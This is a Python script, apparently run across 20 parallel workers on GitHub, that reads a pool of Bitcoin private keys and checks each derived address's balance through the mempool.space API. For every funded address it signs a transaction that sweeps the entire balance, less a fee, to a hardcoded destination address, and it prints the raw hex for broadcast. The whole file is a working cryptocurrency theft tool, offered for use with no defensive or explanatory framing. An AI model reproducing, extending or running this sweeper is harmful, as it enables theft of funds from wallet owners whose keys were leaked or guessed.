import os, requests, time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = 20

def create_raw_tx(wif, balance_sats):
    try:
        k = Key(wif, network='bitcoin')
        fee = 3500 
        amount = balance_sats - fee
        if amount <= 546: return None
        t = Transaction(network='bitcoin')
        t.add_input(k.address(), balance_sats)
        t.add_output(DEST_ADDRESS, amount)
        t.sign(k)
        return t.raw_hex()
    except: return None

def check_key(priv_key):
    try:
        k = Key(priv_key.strip(), network='bitcoin')
        for w_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=w_type)
            # Log visível no console do GitHub
            print(f"🔎 W{WORKER_ID} | {addr}")
            
            try:
                r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10).json()
                bal = r.get('chain_stats', {}).get('funded_txo_sum', 0) - r.get('chain_stats', {}).get('spent_txo_sum', 0)
                
                if bal > 0:
                    print(f"\n🚨 SALDO! {addr}: {bal} sats")
                    raw_hex = create_raw_tx(k.wif(), bal)
                    if raw_hex: print(f"HEX_GEN:{raw_hex}")
                    return True
            except: pass
            time.sleep(0.12)
    except: pass
    return False

if __name__ == "__main__":
    if os.path.exists('MASTER_POOL.txt'):
        with open('MASTER_POOL.txt', 'r') as f:
            all_keys = f.readlines()
        my_keys = [all_keys[i] for i in range(len(all_keys)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
        for key in my_keys:
            check_key(key)
